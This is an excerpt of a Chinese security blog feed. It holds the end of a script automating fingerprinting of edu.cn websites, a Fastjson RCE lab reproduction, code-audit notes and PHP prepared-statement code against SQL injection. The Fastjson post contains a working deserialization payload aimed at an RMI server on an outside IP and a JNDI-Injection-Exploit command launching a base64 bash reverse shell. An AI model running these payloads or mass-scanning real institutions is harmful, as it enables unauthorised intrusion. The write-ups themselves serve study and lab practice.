f.readlines()</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">            url = get_main_domain(url)</span><br><span class="line">            u.append(url)</span><br><span class="line">    u = move_again_domain(u)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> u:</span><br><span class="line">        run(url)</span><br><span class="line">    <span class="comment"># with open(&#x27;u.txt&#x27;,&#x27;w&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     for url in u:</span></span><br><span class="line">    <span class="comment">#         f.write(url + &#x27;\n&#x27;)</span></span><br><span class="line">    print(<span class="string">&quot;[+] Done!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>auto_run_finger.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">从csv文件中取出url，自动识别资产</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csv_data</span>(<span class="params">csv_file</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从csv文件中获取第一列的数据</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    u = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(csv_file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        o = csv.reader(f)</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> o:</span><br><span class="line">            u.append(data[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">command=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    print(<span class="string">f&quot;[+] Current run command:<span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_file</span>(<span class="params">u,filename=<span class="string">&#x27;urls.txt&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    将列表中的url保存到txt中,并以对应的域名进行命名</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> u:</span><br><span class="line">            f.write(url+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dir_csv</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    获取path目录下所有的csv文件, 并返回一个列表</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    csv_list = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;csv&#x27;</span> <span class="keyword">in</span> f:</span><br><span class="line">                csv_list.append(f)</span><br><span class="line">    <span class="keyword">return</span> root,csv_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    csv_file_path= sys.argv[<span class="number">1</span>] <span class="comment"># 保存域名的csv文件目录</span></span><br><span class="line">    root,csv_dir_list = get_dir_csv(path=csv_file_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> csv_filename <span class="keyword">in</span> csv_dir_list:</span><br><span class="line">        csv_filename = root + <span class="string">&#x27;\\&#x27;</span> + csv_filename</span><br><span class="line">        u = get_csv_data(csv_filename)</span><br><span class="line">        file_name = re.search(<span class="string">r&#x27;[a-z]&#123;1,10&#125;.edu.cn.csv&#x27;</span>, csv_filename).group().replace(<span class="string">&#x27;.csv&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        print(<span class="string">f&#x27;[+] save file name <span class="subst">&#123;file_name&#125;</span>&#x27;</span>)</span><br><span class="line">        write_file(u,file_name)</span><br><span class="line">        run(command=<span class="string">f&#x27;python .\Finger.py -f <span class="subst">&#123;file_name&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;Usage:python auto_run_finger.py [file]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        banner()</span><br></pre></td></tr></table></figure><p><img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107064154752.png" alt="image-20230107064154752"></p><p>​       <img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107063935418.png" alt="image-20230107063935418"></p><h3 id="0x02-最后想说的"><a href="#0x02-最后想说的" class="headerlink" title="0x02 最后想说的"></a>0x02 最后想说的</h3><p>这些是我在凌晨看HVV有关 web打点的文章时，突然冒出来的想法，其实以前也有过自动化的想法，奈何一直没有合适机会，这次总算是开始了。</p>]]></content>
      
      
      <categories>
          
          <category> web打点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> subfinder </tag>
            
            <tag> fofa </tag>
            
            <tag> finger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson远程代码执行CNVD-2019-22238</title>
      <link href="2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/"/>
      <url>2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>以前都没怎么写技术有关的文章，可能是觉得自己写的会不好，误导别人。现在，自认为有点实力了，就写些漏洞复现的文章压压筋，另外一个原因就是，在复现找文章总是会出现各种问题，所以，我觉得还是自己写文章，做记录，这样以后又遇到类似的问题就可以看自己写的文章解决了。</p><h3 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h3><p> Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象 Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。 </p><h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>我用的是vulfoucs靶场复现的，fastjson&lt;=1.2.24，由于fastjson版本不同payload也会有所不同，所以这里提前声明一下。</p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106232719456.png" alt="image-20230106232719456"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要步骤 </span><br><span class="line">1.通过dnslog检测漏洞是否存在</span><br><span class="line">2.在公网vps上通过JNDI-Injection-Exploit工具搭建ladp和rmi服务</span><br><span class="line">3.通过rmi协议加载恶意类，利用bash反弹shell</span><br></pre></td></tr></table></figure><p>工具下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;welk1n&#x2F;JNDI-Injection-Exploit.git</span><br></pre></td></tr></table></figure><p>1.通过dns记录简单检测是否存在漏洞，我这里用的是<code>dnslog.cn</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:30205</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">&#123;&quot;zeo&quot;:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;13uw56.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>注意: 双引号和逗号都是英文的，复制之后注意检查，还有注意<code>Content-Type: application/json</code>,提交方式为<code>POST</code></p><p>返回包没有报错就是一般就是利用成功了</p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106231837457.png" alt="image-20230106231837457"></p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106230659916.png" alt="image-20230106230659916"></p><p>2.在vps上通过JNDI-Injection-Exploit工具搭建ldap&amp;rmi服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64加密的bash反弹shell payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;vps的ip地址&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106231218516.png" alt="image-20230106231218516"></p><p>这里的bash 反弹shell可以去<code>https://www.revshells.com/</code>这个网站生成，然后进行base64编码即可。</p><p>3.通过rmi协议请求恶意类，从而执行bash反弹shell的代码，同时在vps上同时监听对应的端口<code>nc -lvvp [port]</code>，这里设置的监听端口是利用bash反弹shell的端口</p><p>不同版本payload有所不同，这里的版本<code>fastjson&lt;=1.2.24</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:32132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;123.249.90.73:1099&#x2F;fanobj&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功反弹shell获取到flag</p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230107000209003.png" alt="image-20230107000209003"></p><p>打完，收工，早上10点打ctf比赛，嘿嘿！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php代码审计_mvc框架审计_文件上传笔记</title>
      <link href="2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2023年啦！最近在学代码审计。如果按照搭建博客的2021年1月算，我已经学了2年的网安啦！但是，我现在才感觉真正入门，如今的我，poc&amp;exp也会写了（能自己独立写，也能写到pocsuite3框架里面去），开始有分析漏洞的能力了（以前只会利用漏洞，不懂为什么payload要那样去打），现在能从代码层面一步一步追踪分析漏洞的成因，我有种打开新世界大门的感觉，我更加有信心了。虽然还有好多收获想说，但是又欲言又止，总之，还有很多东西等着我去探索学习。</p><p>最近这几天写的一些poc列举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">20230104_7_thinkphp_lang_rce.py thinkphp lang远程命令执行</span><br><span class="line">20230103_6_sendproduct100_sqli.py 发货100 M_id SQL注入CNVD-2021-30193</span><br><span class="line">f5_big-ip_rce_cve-2021-22986.py BIG-IP远程代码执行漏洞(CVE-2021-22986)</span><br></pre></td></tr></table></figure><h4 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h4><p>1月7日打算参加长亭科技举办的real world CTF体验赛，由于以前没有经验，所以我打算step by step，当作一次不错的学习机会来对待这个比赛。</p><p>新的一年，我打算把php&amp;java代码审计(漏洞分析能力 漏洞挖掘能力)和内网渗透(复杂网络下的横向渗透能力)学好，有机会还可以学习一下云服务器下的渗透思路（assesskey泄露，CF框架的使用），至少达到中级红队的要求，准备23年6-7月份的护网以及秋招。</p><p>其实除了传统的web安全，我对近源渗透（badUSB，wifi，门禁卡ID&amp;IC卡）以及apt攻击中常用的水坑攻击和鱼叉攻击都非常感兴趣，也都有所了解。</p><h3 id="文件上传审计关键点"><a href="#文件上传审计关键点" class="headerlink" title="文件上传审计关键点"></a>文件上传审计关键点</h3><ul><li>全局寻找关键字 $FILES 以及可能出现在代码中的文字(如，’文件上传成功’)，定位上传功能的代码段</li><li>功能点抓包,再根据参数或路由信息找到对应源代码</li><li>理清上传的判断逻辑（黑名单，白名单，前端js，MIME类型）</li></ul><h3 id="thinkphp框架下审计的关键点"><a href="#thinkphp框架下审计的关键点" class="headerlink" title="thinkphp框架下审计的关键点"></a>thinkphp框架下审计的关键点</h3><ul><li><p>找到入口文件，思考网站的路由信息是如何生成的，网站目录结构</p></li><li><p>找到控制器文件，一般在application目录下，再结合一些功能点抓包得到的参数，理清代码结构逻辑，如在发送的poc中哪个参数对应类，哪个参数对应方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find .&#x2F; -name &quot;*.php&quot;|xargs grep &quot;你要搜索的文件中的文本内容&quot; 一条有用查找文件内容的命令</span><br></pre></td></tr></table></figure></li></ul><ul><li>看使用框架的代码是否规范，是否正确的使用了框架的一些安全检查方法，而不是使用自己写方法。</li></ul><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>理不清楚执行过程，可以通过phpstorm+xdebug设置断点一步一步看执行的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习&amp;生活_php下通过预编译防御sql注入</title>
      <link href="2022/04/28/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-php%E4%B8%8B%E9%80%9A%E8%BF%87%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E5%BE%A1sql%E6%B3%A8%E5%85%A5/"/>
      <url>2022/04/28/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-php%E4%B8%8B%E9%80%9A%E8%BF%87%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E5%BE%A1sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><ul><li>通过预编译，先将查询语句发送给服务器，再发送用户提交的参数信息<h3 id="1-通过PDO防御"><a href="#1-通过PDO防御" class="headerlink" title="1.通过PDO防御"></a>1.通过PDO防御</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// set global general_log = &#x27;on&#x27;  打开日志功能</span></span><br><span class="line"><span class="comment">// show variables like &#x27;general%&#x27; 查看日志是否开启，和日志保存的路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">&#x27;mysql:dbname=security&#x27;</span>;</span><br><span class="line">    <span class="variable">$userName</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$passWord</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$userName</span>,<span class="variable">$passWord</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PDO参数</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="literal">false</span>); <span class="comment">// 启用或禁用预处理语句的模拟，防止宽字节注入</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;setAttribute(PDO::ATTR_ERRMODE,<span class="literal">false</span>);         <span class="comment">// 错误报告，防止报错注入</span></span><br><span class="line"><span class="comment">// $conn-&gt;setAttribute(PDO::MYSQL_ATTR_MULTI_STATEMENTS,false); //多语句查询,防止堆叠查询，union查询在一定条件下可以绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置编码</span></span><br><span class="line"><span class="comment">// $conn-&gt;query(&quot;set names gbk&quot;); </span></span><br><span class="line">   <span class="variable">$conn</span> -&gt;query(<span class="string">&quot;set names utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// 测试宽字节注入，原理就是把转义的反斜杠吃掉，将想要拼接的sql语句从参数中逃逸出来。</span></span><br><span class="line"><span class="comment">// mysql&gt; SELECT `username`,`password` FROM `users` WHERE `id` = &#x27;3  SAFAAND 9&#x27;;</span></span><br><span class="line"><span class="comment">// 实际执行效果:</span></span><br><span class="line"><span class="comment">// SELECT `username`,`password` FROM `users` WHERE `id` = &#x27;3&#x27;;</span></span><br><span class="line"><span class="comment">// mysql在查询的时候只获取第一个字符串，如果后面的字符串之间有空格，则忽略后面的所有字符。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建预处理sql语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT `username`,`password` FROM `users` WHERE `id` = ? &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行预处理sql语句，创建一个PDOstatement</span></span><br><span class="line">    <span class="variable">$pdoStmt</span> = <span class="variable">$conn</span> -&gt; prepare(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定参数</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$pdoStmt</span>-&gt;bindParam(<span class="number">1</span>,<span class="variable">$id</span>,PDO::PARAM_INT);</span><br><span class="line">    <span class="variable">$pdoStmt</span>-&gt;execute([<span class="variable">$id</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$pdoStmt</span>-&gt;fetch(PDO::FETCH_ASSOC)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        print_r(<span class="variable">$row</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Connect ERROR&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-通过mysqli防御"><a href="#2-通过mysqli防御" class="headerlink" title="2.通过mysqli防御"></a>2.通过mysqli防御</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mysqli</span> -&gt; connect_error) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// create a predefined object and get a position</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = ?&quot;</span>;</span><br><span class="line"><span class="variable">$mysqli_stmt</span> = <span class="variable">$mysqli</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//bind param</span></span><br><span class="line"><span class="comment">// stmt =&gt; stagement</span></span><br><span class="line"><span class="comment">// bind_param(&quot;&lt;参数类型[i(int),s(string),d(double)]&gt;&quot;,$para0,$para1,$para2...)</span></span><br><span class="line"><span class="variable">$mysqli_stmt</span>-&gt;bind_param(<span class="string">&quot;i&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//bind result</span></span><br><span class="line"><span class="variable">$mysqli_stmt</span>-&gt;bind_result(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$mysqli_stmt</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$mysqli_stmt</span>-&gt;fetch())</span><br><span 